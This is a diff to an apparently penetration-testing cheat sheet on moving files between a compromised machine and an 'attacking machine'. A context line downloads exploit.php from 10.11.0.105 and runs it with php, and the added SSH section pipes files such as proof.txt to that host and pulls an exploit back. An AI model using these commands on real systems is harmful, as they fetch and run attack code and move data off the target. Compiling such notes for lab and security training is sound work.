@@ -29,6 +29,15 @@ Use wget
 ```
 cd /tmp && wget -O exploit.php 10.11.0.105/exploit.php && php -f exploit.php
 ```
+### SSH
+To put files to the attacking machine
+```
+ssh root@10.11.0.105 "cat > proof.txt" < proof.txt
+```
+To get files from the attacking machine
+```
+ssh root@10.11.0.105 "cat exploit" > exploit
+```
 
 ## To Windows machine
 ### HTTP Server
